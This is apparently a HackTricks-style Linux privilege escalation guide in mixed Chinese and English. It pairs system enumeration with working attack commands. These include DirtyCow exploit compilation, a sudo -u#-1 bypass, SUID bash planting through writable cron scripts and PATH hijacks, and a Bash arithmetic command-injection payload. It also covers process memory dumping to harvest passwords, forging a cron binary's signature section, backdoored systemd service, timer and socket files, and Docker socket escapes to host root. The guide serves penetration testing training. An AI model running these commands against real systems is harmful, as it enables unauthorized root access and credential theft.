# Linux Privilege Escalation

{{#include ../../banners/hacktricks-training.md}}

## 系统信息

### 操作系统信息

让我们开始收集运行中 OS 的相关信息
```bash
(cat /proc/version || uname -a ) 2>/dev/null
lsb_release -a 2>/dev/null # old, not by default on many systems
cat /etc/os-release 2>/dev/null # universal on modern systems
```
### 路径

如果你**have write permissions on any folder inside the `PATH`** 变量，你可能能够 hijack 一些 libraries 或 binaries：
```bash
echo $PATH
```
### 环境信息

环境变量中是否有有价值的信息、密码或 API keys?
```bash
(env || set) 2>/dev/null
```
### Kernel exploits

检查 kernel version，看看是否存在可用于 escalate privileges 的 exploit
```bash
cat /proc/version
uname -a
searchsploit "Linux Kernel"
```
你可以在这里找到一个不错的有漏洞的内核列表以及一些已经 **compiled exploits**： [https://github.com/lucyoa/kernel-exploits](https://github.com/lucyoa/kernel-exploits) 和 [exploitdb sploits](https://gitlab.com/exploit-database/exploitdb-bin-sploits).\
其他可以找到一些 **compiled exploits** 的站点： [https://github.com/bwbwbwbw/linux-exploit-binaries](https://github.com/bwbwbwbw/linux-exploit-binaries), [https://github.com/Kabot/Unix-Privilege-Escalation-Exploits-Pack](https://github.com/Kabot/Unix-Privilege-Escalation-Exploits-Pack)

要从该网站提取所有有漏洞的内核版本，你可以这样做：
```bash
curl https://raw.githubusercontent.com/lucyoa/kernel-exploits/master/README.md 2>/dev/null | grep "Kernels: " | cut -d ":" -f 2 | cut -d "<" -f 1 | tr -d "," | tr ' ' '\n' | grep -v "^\d\.\d$" | sort -u -r | tr '\n' ' '
```
可以帮助查找 kernel exploits 的工具有：

[linux-exploit-suggester.sh](https://github.com/mzet-/linux-exploit-suggester)\
[linux-exploit-suggester2.pl](https://github.com/jondonas/linux-exploit-suggester-2)\
[linuxprivchecker.py](http://www.securitysift.com/download/linuxprivchecker.py) (在受害主机上执行，仅检查 kernel 2.x 的 exploits)

始终 **search the kernel version in Google**，可能某个 kernel exploit 的说明里写有你的 kernel 版本，从而可以确定该 exploit 是否有效。

额外的 kernel exploitation 技术：

{{#ref}}
../../binary-exploitation/linux-kernel-exploitation/adreno-a7xx-sds-rb-priv-bypass-gpu-smmu-kernel-rw.md
{{#endref}}

### CVE-2016-5195 (DirtyCow)

Linux Privilege Escalation - Linux Kernel <= 3.19.0-73.8
```bash
# make dirtycow stable
echo 0 > /proc/sys/vm/dirty_writeback_centisecs
g++ -Wall -pedantic -O2 -std=c++11 -pthread -o dcow 40847.cpp -lutil
https://github.com/dirtycow/dirtycow.github.io/wiki/PoCs
https://github.com/evait-security/ClickNRoot/blob/master/1/exploit.c
```
### Sudo 版本

基于下列出现的易受攻击的 sudo 版本：
```bash
searchsploit sudo
```
你可以用这个 grep 检查 sudo 版本是否存在漏洞。
```bash
sudo -V | grep "Sudo ver" | grep "1\.[01234567]\.[0-9]\+\|1\.8\.1[0-9]\*\|1\.8\.2[01234567]"
```
### Sudo < 1.9.17p1

Sudo 1.9.17p1 之前的版本（**1.9.14 - 1.9.17 < 1.9.17p1**）允许未特权的本地用户在从用户控制的目录使用 `/etc/nsswitch.conf` 文件时，通过 sudo 的 `--chroot` 选项提升到 root 权限。

Here is a [PoC](https://github.com/pr0v3rbs/CVE-2025-32463_chwoot) to exploit that [vulnerability](https://nvd.nist.gov/vuln/detail/CVE-2025-32463). Before running the exploit, make sure that your `sudo` version is vulnerable and that it supports the `chroot` feature.

For more information, refer to the original [vulnerability advisory](https://www.stratascale.com/resource/cve-2025-32463-sudo-chroot-elevation-of-privilege/)

#### sudo < v1.8.28

来自 @sickrov
```
sudo -u#-1 /bin/bash
```
### Dmesg 签名验证失败

查看 **smasher2 box of HTB**，了解该 vuln 如何被利用的示例
```bash
dmesg 2>/dev/null | grep "signature"
```
### 更多系统枚举
```bash
date 2>/dev/null #Date
(df -h || lsblk) #System stats
lscpu #CPU info
lpstat -a 2>/dev/null #Printers info
```
## 列出可能的防御措施

### AppArmor
```bash
if [ `which aa-status 2>/dev/null` ]; then
aa-status
elif [ `which apparmor_status 2>/dev/null` ]; then
apparmor_status
elif [ `ls -d /etc/apparmor* 2>/dev/null` ]; then
ls -d /etc/apparmor*
else
echo "Not found AppArmor"
fi
```
### Grsecurity
```bash
((uname -r | grep "\-grsec" >/dev/null 2>&1 || grep "grsecurity" /etc/sysctl.conf >/dev/null 2>&1) && echo "Yes" || echo "Not found grsecurity")
```
### PaX
```bash
(which paxctl-ng paxctl >/dev/null 2>&1 && echo "Yes" || echo "Not found PaX")
```
### Execshield
```bash
(grep "exec-shield" /etc/sysctl.conf || echo "Not found Execshield")
```
### SElinux
```bash
(sestatus 2>/dev/null || echo "Not found sestatus")
```
### ASLR
```bash
cat /proc/sys/kernel/randomize_va_space 2>/dev/null
#If 0, not enabled
```
## Docker Breakout

如果你在 docker container 内部，可以尝试从中逃逸：

{{#ref}}
docker-security/
{{#endref}}

## 驱动器

检查 **哪些已挂载或未挂载**、挂载位置以及原因。如果有任何未挂载的项，你可以尝试将其挂载并检查是否包含私密信息。
```bash
ls /dev 2>/dev/null | grep -i "sd"
cat /etc/fstab 2>/dev/null | grep -v "^#" | grep -Pv "\W*\#" 2>/dev/null
#Check if credentials in fstab
grep -E "(user|username|login|pass|password|pw|credentials)[=:]" /etc/fstab /etc/mtab 2>/dev/null
```
## 有用的软件

枚举有用的二进制文件
```bash
which nmap aws nc ncat netcat nc.traditional wget curl ping gcc g++ make gdb base64 socat python python2 python3 python2.7 python2.6 python3.6 python3.7 perl php ruby xterm doas sudo fetch docker lxc ctr runc rkt kubectl 2>/dev/null
```
另外，检查是否已安装 **any compiler is installed**。如果你需要使用某些 kernel exploit，这很有用，因为建议在将要使用它的机器上（或在一台类似的机器上）编译它。
```bash
(dpkg --list 2>/dev/null | grep "compiler" | grep -v "decompiler\|lib" 2>/dev/null || yum list installed 'gcc*' 2>/dev/null | grep gcc 2>/dev/null; which gcc g++ 2>/dev/null || locate -r "/gcc[0-9\.-]\+$" 2>/dev/null | grep -v "/doc/")
```
### 已安装的易受攻击软件

检查**已安装的软件包和服务的版本**。可能存在一些较旧的 Nagios 版本（例如），可能被利用来 escalating privileges…\
建议手动检查更可疑的已安装软件的版本。
```bash
dpkg -l #Debian
rpm -qa #Centos
```
如果你有对该机器的 SSH 访问权限，你也可以使用 **openVAS** 来检测机器中安装的已过时或存在漏洞的软件。

> [!NOTE] > _注意：这些命令会显示大量大多无用的信息，因此建议使用像 OpenVAS 或类似的应用来检查任何已安装软件版本是否容易受到已知 exploits 的影响_

## 进程

查看正在执行的 **哪些进程**，并检查是否有任何进程拥有 **超过其应有的权限**（例如 tomcat 被 root 执行？）
```bash
ps aux
ps -ef
top -n 1
```
Always check for possible [**electron/cef/chromium debuggers** running, you could abuse it to escalate privileges](electron-cef-chromium-debugger-abuse.md). **Linpeas** detect those by checking the `--inspect` parameter inside the command line of the process.\
另外，**检查你对进程二进制文件的权限**，也许你可以覆盖某个文件。

### 进程监控

你可以使用像 [**pspy**](https://github.com/DominicBreuker/pspy) 这样的工具来监控进程。 这对于识别频繁执行或在满足一组条件时运行的易受攻击进程非常有用。

### 进程内存

服务器上的某些服务会把 **credentials in clear text inside the memory**。\
通常，你需要 **root privileges** 来读取属于其他用户的进程的内存，因此这通常在你已经是 root 时更有用，以发现更多的 credentials。\
但是，请记住 **作为普通用户，你可以读取你自己拥有的进程的内存**。

> [!WARNING]
> 请注意，现在大多数机器 **默认不允许 ptrace**，这意味着你无法转储属于你这个非特权用户的其他进程。
>
> 文件 _**/proc/sys/kernel/yama/ptrace_scope**_ 控制 ptrace 的可访问性：
>
> - **kernel.yama.ptrace_scope = 0**：所有与相同 uid 的进程都可以被调试。这是 ptracing 的经典工作方式。
> - **kernel.yama.ptrace_scope = 1**：只有父进程可以被调试。
> - **kernel.yama.ptrace_scope = 2**：只有管理员可以使用 ptrace，因为它需要 CAP_SYS_PTRACE 能力。
> - **kernel.yama.ptrace_scope = 3**：不允许使用 ptrace 跟踪任何进程。设置后需要重启才能重新启用 ptrace。

#### GDB

如果你能够访问某个 FTP 服务（例如）的内存，你可以获取 Heap 并在其中搜索 credentials。
```bash
gdb -p <FTP_PROCESS_PID>
(gdb) info proc mappings
(gdb) q
(gdb) dump memory /tmp/mem_ftp <START_HEAD> <END_HEAD>
(gdb) q
strings /tmp/mem_ftp #User and password
```
#### GDB 脚本
```bash:dump-memory.sh
#!/bin/bash
#./dump-memory.sh <PID>
grep rw-p /proc/$1/maps \
| sed -n 's/^\([0-9a-f]*\)-\([0-9a-f]*\) .*$/\1 \2/p' \
| while read start stop; do \
gdb --batch --pid $1 -ex \
"dump memory $1-$start-$stop.dump 0x$start 0x$stop"; \
done
```
#### /proc/$pid/maps & /proc/$pid/mem

对于给定的进程 ID，**maps 显示该进程的内存如何被映射在其** 虚拟地址空间；它还显示每个映射区域的**权限**。该 **mem** 伪文件**暴露了进程本身的内存**。通过 **maps** 文件我们可以知道哪些**内存区域是可读的**以及它们的偏移量。我们使用这些信息来**在 mem 文件中定位并转储所有可读区域**到一个文件。
```bash
procdump()
(
cat /proc/$1/maps | grep -Fv ".so" | grep " 0 " | awk '{print $1}' | ( IFS="-"
while read a b; do
dd if=/proc/$1/mem bs=$( getconf PAGESIZE ) iflag=skip_bytes,count_bytes \
skip=$(( 0x$a )) count=$(( 0x$b - 0x$a )) of="$1_mem_$a.bin"
done )
cat $1*.bin > $1.dump
rm $1*.bin
)
```
#### /dev/mem

`/dev/mem` 提供对系统 **物理** 内存的访问，而不是虚拟内存。内核的虚拟地址空间可以通过 /dev/kmem 访问。\
通常，`/dev/mem` 只有 **root** 和 **kmem** 组可读。
```
strings /dev/mem -n10 | grep -i PASS
```
### ProcDump 适用于 linux

ProcDump 是对来自 Sysinternals 套件、用于 Windows 的经典 ProcDump 工具在 Linux 上的重新实现。可在 [https://github.com/Sysinternals/ProcDump-for-Linux](https://github.com/Sysinternals/ProcDump-for-Linux) 获取。
```
procdump -p 1714

ProcDump v1.2 - Sysinternals process dump utility
Copyright (C) 2020 Microsoft Corporation. All rights reserved. Licensed under the MIT license.
Mark Russinovich, Mario Hewardt, John Salem, Javid Habibi
Monitors a process and writes a dump file when the process meets the
specified criteria.

Process:		sleep (1714)
CPU Threshold:		n/a
Commit Threshold:	n/a
Thread Threshold:		n/a
File descriptor Threshold:		n/a
Signal:		n/a
Polling interval (ms):	1000
Threshold (s):	10
Number of Dumps:	1
Output directory for core dumps:	.

Press Ctrl-C to end monitoring without terminating the process.

[20:20:58 - WARN]: Procdump not running with elevated credentials. If your uid does not match the uid of the target process procdump will not be able to capture memory dumps
[20:20:58 - INFO]: Timed:
[20:21:00 - INFO]: Core dump 0 generated: ./sleep_time_2021-11-03_20:20:58.1714
```
### 工具

要转储进程内存你可以使用:

- [**https://github.com/Sysinternals/ProcDump-for-Linux**](https://github.com/Sysinternals/ProcDump-for-Linux)
- [**https://github.com/hajzer/bash-memory-dump**](https://github.com/hajzer/bash-memory-dump) (root) - \_你可以手动移除 root 的权限要求并转储你拥有的进程
- Script A.5 from [**https://www.delaat.net/rp/2016-2017/p97/report.pdf**](https://www.delaat.net/rp/2016-2017/p97/report.pdf) (root 是必需的)

### 从进程内存获取凭证

#### 手动示例

如果发现 authenticator 进程正在运行:
```bash
ps -ef | grep "authenticator"
root      2027  2025  0 11:46 ?        00:00:00 authenticator
```
你可以 dump the process (见前面的章节以找到 dump the memory of a process 的不同方法) 并在 memory 中搜索 credentials：
```bash
./dump-memory.sh 2027
strings *.dump | grep -i password
```
#### mimipenguin

该工具 [**https://github.com/huntergregal/mimipenguin**](https://github.com/huntergregal/mimipenguin) 将会**从内存窃取明文凭证**，并从一些**已知文件**中获取这些凭证。它需要 root 权限才能正常工作。

| 功能                                              | 进程名               |
| ------------------------------------------------- | -------------------- |
| GDM 密码 (Kali Desktop, Debian Desktop)           | gdm-password         |
| Gnome Keyring (Ubuntu Desktop, ArchLinux Desktop) | gnome-keyring-daemon |
| LightDM (Ubuntu Desktop)                          | lightdm              |
| VSFTPd (活动的 FTP 连接)                          | vsftpd               |
| Apache2 (活动的 HTTP Basic Auth 会话)             | apache2              |
| OpenSSH (活动的 SSH 会话 - sudo 使用)             | sshd:                |

#### 搜索正则/[truffleproc](https://github.com/controlplaneio/truffleproc)
```bash
# un truffleproc.sh against your current Bash shell (e.g. $$)
./truffleproc.sh $$
# coredumping pid 6174
Reading symbols from od...
Reading symbols from /usr/lib/systemd/systemd...
Reading symbols from /lib/systemd/libsystemd-shared-247.so...
Reading symbols from /lib/x86_64-linux-gnu/librt.so.1...
[...]
# extracting strings to /tmp/tmp.o6HV0Pl3fe
# finding secrets
# results in /tmp/tmp.o6HV0Pl3fe/results.txt
```
## Scheduled/Cron 作业

### Crontab UI (alseambusher) 以 root 身份运行 – 基于 Web 的调度器 privesc

如果一个 web “Crontab UI” 面板 (alseambusher/crontab-ui) 以 root 身份运行并且只绑定到 loopback，你仍然可以通过 SSH 本地端口转发访问它并创建一个有特权的任务以提权。

Typical chain
- 发现仅绑定到 loopback 的端口（例如 127.0.0.1:8000）和 Basic-Auth realm via `ss -ntlp` / `curl -v localhost:8000`
- 在操作工件中查找凭据：
- 带有 `zip -P <password>` 的备份/脚本
- systemd unit 暴露 `Environment="BASIC_AUTH_USER=..."`, `Environment="BASIC_AUTH_PWD=..."`
- 建立隧道并登录：
```bash
ssh -L 9001:localhost:8000 user@target
# browse http://localhost:9001 and authenticate
```
- 创建一个 high-priv job 并立即运行（会生成 SUID shell）：
```bash
# Name: escalate
# Command:
cp /bin/bash /tmp/rootshell && chmod 6777 /tmp/rootshell
```
- 使用它:
```bash
/tmp/rootshell -p   # root shell
```
加固
- 不要以 root 身份运行 Crontab UI；使用专用用户并授予最小权限
- 绑定到 localhost，并通过 firewall/VPN 进一步限制访问；不要重复使用密码
- 避免在 unit files 中嵌入 secrets；使用 secret stores 或 root-only EnvironmentFile
- 为 on-demand job executions 启用 audit/logging

检查是否有任何 scheduled job 存在漏洞。你或许可以利用由 root 执行的脚本（wildcard vuln? 能修改 root 使用的文件吗？使用 symlinks? 在 root 使用的目录中创建特定文件？）。
```bash
crontab -l
ls -al /etc/cron* /etc/at*
cat /etc/cron* /etc/at* /etc/anacrontab /var/spool/cron/crontabs/root 2>/dev/null | grep -v "^#"
```
### Cron 路径

例如，在 _/etc/crontab_ 中你可以找到 PATH：_PATH=**/home/user**:/usr/local/sbin:/usr/local/bin:/sbin:/bin:/usr/sbin:/usr/bin_

(_注意用户 "user" 对 /home/user 具有写权限_)

如果在此 crontab 中 root 用户尝试在未设置 PATH 的情况下执行某个命令或脚本。例如： _\* \* \* \* root overwrite.sh_\
然后，你可以使用以下方法获取 root shell：
```bash
echo 'cp /bin/bash /tmp/bash; chmod +s /tmp/bash' > /home/user/overwrite.sh
#Wait cron job to be executed
/tmp/bash -p #The effective uid and gid to be set to the real uid and gid
```
### Cron 使用带有通配符的脚本 (Wildcard Injection)

如果一个由 root 执行的脚本在命令中包含 “**\***”，你可以利用它做出意想不到的事情（比如 privesc）。示例：
```bash
rsync -a *.sh rsync://host.back/src/rbd #You can create a file called "-e sh myscript.sh" so the script will execute our script
```
**如果 wildcard 前面是类似** _**/some/path/\***_ **这样的路径的前缀，就不会有漏洞（即使** _**./\***_ **也不行）。**

阅读下列页面了解更多 wildcard 利用技巧：


{{#ref}}
wildcards-spare-tricks.md
{{#endref}}


### Bash arithmetic expansion injection in cron log parsers

Bash 在 ((...)), $((...)) 和 let 中，在算术求值之前执行参数展开和命令替换。如果一个以 root 身份运行的 cron/解析器读取不可信的日志字段并将其传入算术上下文，攻击者可以注入命令替换 $(...)，该替换会在 cron 运行时以 root 身份执行。

- Why it works: In Bash, expansions occur in this order: parameter/variable expansion, command substitution, arithmetic expansion, then word splitting and pathname expansion. So a value like `$(/bin/bash -c 'id > /tmp/pwn')0` is first substituted (running the command), then the remaining numeric `0` is used for the arithmetic so the script continues without errors.

- Typical vulnerable pattern:
```bash
#!/bin/bash
# Example: parse a log and "sum" a count field coming from the log
while IFS=',' read -r ts user count rest; do
# count is untrusted if the log is attacker-controlled
(( total += count ))     # or: let "n=$count"
done < /var/www/app/log/application.log
```

- Exploitation: 让攻击者可控的文本被写入被解析的日志，使看起来像数字的字段包含命令替换并以数字结尾。确保你的命令不向 stdout 输出（或将其重定向），以便算术运算保持有效。
```bash
# Injected field value inside the log (e.g., via a crafted HTTP request that the app logs verbatim):
$(/bin/bash -c 'cp /bin/bash /tmp/sh; chmod +s /tmp/sh')0
# When the root cron parser evaluates (( total += count )), your command runs as root.
```

### Cron script overwriting and symlink

如果你能修改由 root 执行的 **cron script**，就可以非常容易地获得一个 shell：
```bash
echo 'cp /bin/bash /tmp/bash; chmod +s /tmp/bash' > </PATH/CRON/SCRIPT>
#Wait until it is executed
/tmp/bash -p
```
如果由 root 执行的 script 使用了一个你有完全访问权限的 **directory where you have full access**，删除该 folder 并 **create a symlink folder to another one** 去指向由你控制的脚本，可能会很有用。
```bash
ln -d -s </PATH/TO/POINT> </PATH/CREATE/FOLDER>
```
### 自定义签名的 cron binaries 与可写 payloads
Blue teams 有时会通过转储自定义 ELF 节并在以 root 身份执行前用 `grep` 查找厂商字符串来“签名”由 cron 驱动的二进制文件。如果该二进制是 group-writable（例如 `/opt/AV/periodic-checks/monitor` 属于 `root:devs 770`）并且你能 leak 签名材料，你可以伪造该节并劫持该 cron 任务：

1. 使用 `pspy` 捕获验证流程。在 Era，root 运行了 `objcopy --dump-section .text_sig=text_sig_section.bin monitor`，随后运行 `grep -oP '(?<=UTF8STRING        :)Era Inc.' text_sig_section.bin`，然后执行该文件。
2. 使用从 `signing.zip` 中 leak 的密钥/配置重建预期的证书：
```bash
openssl req -x509 -new -nodes -key key.pem -config x509.genkey -days 365 -out cert.pem
```
3. 构建一个恶意替换（例如，放置一个 SUID bash、添加你的 SSH key），并将证书嵌入到 `.text_sig` 以使 grep 通过：
```bash
gcc -fPIC -pie monitor.c -o monitor
objcopy --add-section .text_sig=cert.pem monitor
objcopy --dump-section .text_sig=text_sig_section.bin monitor
strings text_sig_section.bin | grep 'Era Inc.'
```
4. 在保留执行位的同时覆盖计划的二进制：
```bash
cp monitor /opt/AV/periodic-checks/monitor
chmod 770 /opt/AV/periodic-checks/monitor
```
5. 等待下一次 cron 运行；一旦这种简单的签名检查通过，你的 payload 就会以 root 身份运行。

### Frequent cron jobs

你可以监控进程来查找那些每隔 1、2 或 5 分钟被执行的进程。也许你可以利用它来提升权限。

例如，要 **在 1 分钟内每 0.1 秒监控一次**、**按执行次数从少到多排序** 并删除被执行次数最多的命令，你可以做：
```bash
for i in $(seq 1 610); do ps -e --format cmd >> /tmp/monprocs.tmp; sleep 0.1; done; sort /tmp/monprocs.tmp | uniq -c | grep -v "\[" | sed '/^.\{200\}./d' | sort | grep -E -v "\s*[6-9][0-9][0-9]|\s*[0-9][0-9][0-9][0-9]"; rm /tmp/monprocs.tmp;
```
**你也可以使用** [**pspy**](https://github.com/DominicBreuker/pspy/releases)（它会监视并列出每个启动的进程）。

### 不可见的 cron jobs

可以通过**在注释后放置回车符**（不带换行字符）来创建一个 cronjob，cron job 仍会生效。示例（注意回车字符）：
```bash
#This is a comment inside a cron config file\r* * * * * echo "Surprise!"
```
## 服务

### 可写 _.service_ 文件

检查是否能写入任何 `.service` 文件，如果可以，**你可以修改它**，使其**执行**你的**backdoor 在**服务**启动**、**重启**或**停止**时（也许你需要等到机器重启）。\  
例如，在 .service 文件中通过 **`ExecStart=/tmp/script.sh`** 创建你的 backdoor

### 可写的服务二进制文件

请记住，如果你对**由服务执行的二进制文件拥有写权限**，你可以将它们替换为 backdoors，这样当服务被重新执行时，backdoors 就会被执行。

### systemd PATH - 相对路径

你可以查看 **systemd** 使用的 PATH：
```bash
systemctl show-environment
```
如果你发现你可以在路径的任何文件夹中**write**，你可能能够**escalate privileges**。你需要在如下服务配置文件中搜索使用了**relative paths being used on service configurations**的情况：
```bash
ExecStart=faraday-server
ExecStart=/bin/sh -ec 'ifup --allow=hotplug %I; ifquery --state %I'
ExecStop=/bin/sh "uptux-vuln-bin3 -stuff -hello"
```
然后，在你有写权限的 systemd PATH 文件夹中创建一个与相对路径 binary 同名的 **executable**，当该 service 被要求执行易受攻击的操作（**Start**, **Stop**, **Reload**）时，你的 **backdoor will be executed**（非特权用户通常不能 start/stop services，但检查是否可以使用 `sudo -l`）。

**Learn more about services with `man systemd.service`.**

## **Timers**

**Timers** 是 systemd 的 unit 文件，其名称以 `**.timer**` 结尾，用于控制 `**.service**` 文件或事件。**Timers** 可以作为 cron 的替代，因为它们内建对日历时间事件和单调时间事件的支持，并且可以异步运行。

你可以用以下命令列出所有 timers:
```bash
systemctl list-timers --all
```
### 可写的定时器

如果你能够修改一个定时器，你就可以让其执行 systemd.unit 的某些现有单元（例如 `.service` 或 `.target`）。
```bash
Unit=backdoor.service
```
In the documentation you can read what the Unit is:

> 当此 timer 到期时要激活的 unit。参数是一个 unit 名称，其后缀不是 ".timer"。如果未指定，该值默认为一个与 timer unit 名称相同（仅后缀不同）的 service。（见上文。）建议被激活的 unit 名称与 timer unit 的 unit 名称除后缀外相同。

Therefore, to abuse this permission you would need to:

- 找到某个 systemd unit（例如 `.service`），该 unit 正在**执行一个可写的二进制文件**
- 找到某个 systemd unit 正在**执行一个相对路径**，并且你对 **systemd PATH** 具有**写权限**（以冒充该可执行文件）

**Learn more about timers with `man systemd.timer`.**

### **Enabling Timer**

要启用 timer，你需要 root 权限并执行：
```bash
sudo systemctl enable backu2.timer
Created symlink /etc/systemd/system/multi-user.target.wants/backu2.timer → /lib/systemd/system/backu2.timer.
```
注意 **timer** 是通过在 `/etc/systemd/system/<WantedBy_section>.wants/<name>.timer` 上创建一个符号链接来**激活**的。

## 套接字

Unix 域套接字 (UDS) 使得在客户端-服务器模型中在同一台或不同机器上进行**进程间通信**成为可能。它们利用标准 Unix 描述符文件进行进程间通信，并通过 `.socket` 文件进行配置。

Sockets 可以使用 `.socket` 文件进行配置。

**了解有关 sockets 的更多信息，请参阅 `man systemd.socket`。** 在该文件中，可以配置若干有趣的参数：

- `ListenStream`, `ListenDatagram`, `ListenSequentialPacket`, `ListenFIFO`, `ListenSpecial`, `ListenNetlink`, `ListenMessageQueue`, `ListenUSBFunction`: 这些选项各不相同，但总体上用于**指示将在哪监听**该套接字（例如 AF_UNIX 套接字文件的路径、要监听的 IPv4/IPv6 和/或端口号等）。
- `Accept`: 接受一个布尔参数。如果为 **true**，则为每个传入连接生成一个 **service 实例**，并且只将连接套接字传递给该实例。如果为 **false**，则所有监听套接字本身会被**传递给被启动的 service 单元**，并且仅为所有连接生成一个 service 单元。对于 datagram sockets 和 FIFOs，此值会被忽略，在这些情况下单个 service 单元无条件地处理所有传入流量。**默认值为 false。** 出于性能原因，建议新的 daemon 以适合 `Accept=no` 的方式编写。
- `ExecStartPre`, `ExecStartPost`: 接受一条或多条命令行，分别在监听 **sockets**/FIFOs 被**创建**并绑定之前或之后**执行**。命令行的第一个标记必须是绝对文件名，之后为该进程的参数。
- `ExecStopPre`, `ExecStopPost`: 在监听 **sockets**/FIFOs 被**关闭**并移除之前或之后**执行**的额外**命令**。
- `Service`: 指定在**有入站流量时**要**激活**的 **service** 单元名。此设置仅允许用于 Accept=no 的 socket。它默认为与 socket 同名的 service（后缀被替换）。在大多数情况下，通常不需要使用此选项。

### 可写的 .socket 文件

如果你发现一个**可写的** `.socket` 文件，你可以在 `[Socket]` 节的开头添加类似 `ExecStartPre=/home/kali/sys/backdoor` 的内容，backdoor 将在 socket 被创建之前被执行。因此，你**可能需要等待机器重启。**\
_注意系统必须正在使用该 socket 文件配置，否则 backdoor 不会被执行_

### 可写的 sockets

如果你**识别到任何可写的 socket**（_这里指的是 Unix Sockets，而不是配置文件 `.socket`_），那么你**可以与该 socket 通信**，并可能利用其中的漏洞。

### 枚举 Unix Sockets
```bash
netstat -a -p --unix
```
### 原始连接
```bash
#apt-get install netcat-openbsd
nc -U /tmp/socket  #Connect to UNIX-domain stream socket
nc -uU /tmp/socket #Connect to UNIX-domain datagram socket

#apt-get install socat
socat - UNIX-CLIENT:/dev/socket #connect to UNIX-domain socket, irrespective of its type
```
**利用示例：**


{{#ref}}
socket-command-injection.md
{{#endref}}

### HTTP sockets

注意可能存在一些 **sockets listening for HTTP** 请求（_我不是在说 .socket files，而是指作为 unix sockets 的文件_）。你可以用以下命令检查：
```bash
curl --max-time 2 --unix-socket /pat/to/socket/files http:/index
```
如果该套接字 **对 HTTP 请求有响应**，那么你可以 **与它通信**，并可能 **exploit some vulnerability**。

### 可写的 Docker Socket

The Docker socket, often found at `/var/run/docker.sock`, is a critical file that should be secured. By default, it's writable by the `root` user and members of the `docker` group. Possessing write access to this socket can lead to privilege escalation. Here's a breakdown of how this can be done and alternative methods if the Docker CLI isn't available.

#### **Privilege Escalation with Docker CLI**

If you have write access to the Docker socket, you can escalate privileges using the following commands:
```bash
docker -H unix:///var/run/docker.sock run -v /:/host -it ubuntu chroot /host /bin/bash
docker -H unix:///var/run/docker.sock run -it --privileged --pid=host debian nsenter -t 1 -m -u -n -i sh
```
这些命令允许你运行一个容器，使其对宿主机的文件系统具有 root 级别访问权限。

#### **直接通过 Docker API**

如果 Docker CLI 不可用，仍然可以通过 Docker API 和 `curl` 命令操作 Docker socket。

1.  **列出 Docker 镜像：** 获取可用镜像列表。

```bash
curl -XGET --unix-socket /var/run/docker.sock http://localhost/images/json
```

2.  **创建容器：** 发送请求创建一个将宿主机根目录挂载到容器内的容器。

```bash
curl -XPOST -H "Content-Type: application/json" --unix-socket /var/run/docker.sock -d '{"Image":"<ImageID>","Cmd":["/bin/sh"],"DetachKeys":"Ctrl-p,Ctrl-q","OpenStdin":true,"Mounts":[{"Type":"bind","Source":"/","Target":"/host_root"}]}' http://localhost/containers/create
```

启动新创建的容器：

```bash
curl -XPOST --unix-socket /var/run/docker.sock http://localhost/containers/<NewContainerID>/start
```

3.  **附加到容器：** 使用 `socat` 与容器建立连接，从而可以在其中执行命令。

```bash
socat - UNIX-CONNECT:/var/run/docker.sock
POST /containers/<NewContainerID>/attach?stream=1&stdin=1&stdout=1&stderr=1 HTTP/1.1
Host:
Connection: Upgrade
Upgrade: tcp
```

在建立 `socat` 连接后，你可以在容器中直接执行命令，并以对宿主机文件系统的 root 级别访问权限运行它们。

### 其他

注意，如果你对 docker socket 有写权限，因为你 **在 `docker` 组内**，你有 [**more ways to escalate privileges**](interesting-groups-linux-pe/index.html#docker-group)。如果 [**docker API is listening in a port** you can also be able to compromise it](../../network-services-pentesting/2375-pentesting-docker.md#compromising)。

查看 **更多从 docker 逃逸或滥用它以提升权限的方法** 在：


{{#ref}}
docker-security/
{{#endref}}

## Containerd (ctr) 提权

如果你发现可以使用 **`ctr`** 命令，请阅读以下页面，因为 **你可能能够滥用它来提升权限**：


{{#ref}}
containerd-ctr-privilege-escalation.md
{{#endref}}

## **RunC** 提权

如果你发现可以使用 **`runc`** 命令，请阅读以下页面，因为 **你可能能够滥用它来提升权限**：


{{#ref}}
runc-privilege-escalation.md
{{#endref}}

## **D-Bus**

D-Bus 是一个复杂的进程间通信（IPC）系统，使应用程序能够高效地交互和共享数据。它为现代 Linux 系统而设计，提供了一个稳健的框架来支持不同形式的应用间通信。

该系统功能多样，支持增强进程间数据交换的基本 IPC，类似于 **增强的 UNIX domain sockets**。此外，它有助于广播事件或信号，促进系统组件之间的无缝集成。例如，来自蓝牙守护进程的来电信号可以促使音乐播放器静音，从而改善用户体验。D-Bus 还支持远程对象系统，简化应用间的服务请求和方法调用，简化传统上复杂的流程。

D-Bus 基于 **允许/拒绝模型** 运行，根据匹配策略规则的累积效果管理消息权限（方法调用、信号发送等）。这些策略指定了与总线的交互，可能会通过滥用这些权限导致提权。

下面给出了 `/etc/dbus-1/system.d/wpa_supplicant.conf` 中此类策略的一个示例，详细说明了 root 用户拥有、发送和接收来自 `fi.w1.wpa_supplicant1` 的消息的权限。

未指定用户或组的策略适用于所有人，而 “default” 上下文策略适用于未被其他具体策略覆盖的所有主体。
```xml
<policy user="root">
<allow own="fi.w1.wpa_supplicant1"/>
<allow send_destination="fi.w1.wpa_supplicant1"/>
<allow send_interface="fi.w1.wpa_supplicant1"/>
<allow receive_sender="fi.w1.wpa_supplicant1" receive_type="signal"/>
</policy>
```
**在此学习如何 enumerate 并 exploit D-Bus 通信：**


{{#ref}}
d-bus-enumeration-and-command-injection-privilege-escalation.md
{{#endref}}

## **Network**

通常对 network 进行 enumerate 并确定 machine 的位置很有趣。

### Generic enumeration
```bash
#Hostname, hosts and DNS
cat /etc/hostname /etc/hosts /etc/resolv.conf
dnsdomainname

#Content of /etc/inetd.conf & /etc/xinetd.conf
cat /etc/inetd.conf /etc/xinetd.conf

#Interfaces
cat /etc/networks
(ifconfig || ip a)

#Neighbours
(arp -e || arp -a)
(route || ip n)

#Iptables rules
(timeout 1 iptables -L 2>/dev/null; cat /etc/iptables/* | grep -v "^#" | grep -Pv "\W*\#" 2>/dev/null)

#Files used by network services
lsof -i
```
### Open ports

始终在访问之前检查运行于目标机器上且你之前无法与之交互的 network services：
```bash
(netstat -punta || ss --ntpu)
(netstat -punta || ss --ntpu) | grep "127.0"
```
### Sniffing

检查你是否能够 sniff traffic。如果可以，你可能能够获取一些 credentials。
```
timeout 1 tcpdump
```
## 用户

### 通用枚举

检查 **who**（你是谁）、你拥有哪些 **privileges**、系统中有哪些 **users**、哪些可以 **login**、以及哪些拥有 **root privileges**：
```bash
#Info about me
id || (whoami && groups) 2>/dev/null
#List all users
cat /etc/passwd | cut -d: -f1
#List users with console
cat /etc/passwd | grep "sh$"
#List superusers
awk -F: '($3 == "0") {print}' /etc/passwd
#Currently logged users
w
